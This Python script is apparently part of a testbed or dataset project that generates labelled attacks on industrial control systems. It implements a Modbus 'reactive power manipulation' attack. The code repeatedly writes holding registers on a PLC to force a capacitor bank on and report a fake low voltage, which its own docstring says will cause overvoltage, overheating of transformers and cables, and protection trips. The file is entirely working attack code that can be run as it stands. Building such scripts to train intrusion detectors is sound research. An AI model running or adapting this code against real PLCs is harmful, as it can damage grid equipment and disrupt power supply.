"""
Attack #12: Reactive_Power_Manipulation (Reactive Power Manipulation)
=====================================================================
Target register: HR1 (Capacitor) + HR5 (Min Voltage)
Technique: Forces the capacitor bank permanently ON (HR1=1) while reporting
           a low voltage, driving the PLC into over-compensation.
Effect: The capacitor stays unnecessarily engaged, voltage rises
        (overvoltage), the transformer and cables overheat, and
        overvoltage protection trips.
MITRE ATT&CK for ICS: T0836 - Modify Parameter
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR1_CAPACITOR, HR5_MIN_VOLTAGE,
    ATTACK_LOOP_DELAY,
    LABEL_REACTIVE_POWER
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
FAKE_LOW_VOLTAGE = 910       # 0.910 pu - just below the UV threshold,
                             # forcing the PLC to turn the capacitor on
CAP_FORCE_ON     = 1         # Capacitor permanently on

ATTACK_NAME = "Reactive_Power_Manipulation"
ATTACK_ID   = LABEL_REACTIVE_POWER


def run_attack(duration_sec=600, label_manager=None):
    """
    Reactive power manipulation.
    Writes HR1=1 (capacitor on) + HR5=910 (low voltage) to drive the PLC
    into over-compensation, creating an overvoltage condition.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: HR{HR1_CAPACITOR} (Cap) + HR{HR5_MIN_VOLTAGE} (Volt)")
    print(f"  Injected: HR1->{CAP_FORCE_ON} | HR5->{FAKE_LOW_VOLTAGE} ({FAKE_LOW_VOLTAGE/1000:.3f}pu)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR1={CAP_FORCE_ON}, HR5={FAKE_LOW_VOLTAGE} ({FAKE_LOW_VOLTAGE/1000:.3f}pu)"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR1_CAPACITOR, value=CAP_FORCE_ON)
                client.write_register(address=HR5_MIN_VOLTAGE, value=FAKE_LOW_VOLTAGE)
                packet_count += 2
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [REACTIVE] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 200 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [REACTIVE] packet #{packet_count} | "
                      f"Cap=ON, V={FAKE_LOW_VOLTAGE/1000:.3f}pu | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [REACTIVE] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )
        print(f"\n  [REACTIVE] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
